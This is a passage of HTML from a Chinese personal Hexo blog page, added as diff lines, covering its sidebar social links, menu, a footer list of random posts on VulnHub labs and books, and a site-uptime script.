+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/142%20DARKHOLE2/" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《人生》路遥">《人生》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/108%20MATRIX/" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/3%E3%80%8A%E5%B9%B3%E5%87%A1%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《平凡的世界》路遥">《平凡的世界》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/38%E3%80%8A%E5%84%BF%E5%AD%90%E4%B8%8E%E6%83%85%E4%BA%BA%E3%80%8B%E5%8A%B3%E4%BC%A6%E6%96%AF/" title="《儿子与情人》劳伦斯">《儿子与情人》劳伦斯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/28%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B%E4%BF%9D%E7%BD%97%C2%B7%E5%8D%A1%E6%8B%89%E5%B0%BC%E4%BB%80/" title="《当呼吸化为空气》保罗·卡拉尼什">《当呼吸化为空气》保罗·卡拉尼什</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/" title="《我是猫》夏目漱石">《我是猫》夏目漱石</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/70%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B%E5%B2%B8%E8%A7%81%E4%B8%80%E9%83%8E/" title="《被讨厌的勇气》岸见一郎">《被讨厌的勇气》岸见一郎</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ESFP%E8%A7%A3%E8%AF%BB/" title="ESFP解读">ESFP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/02/VULNHUB/114%20ICA/" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/03/18/SAFE/Trojan/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
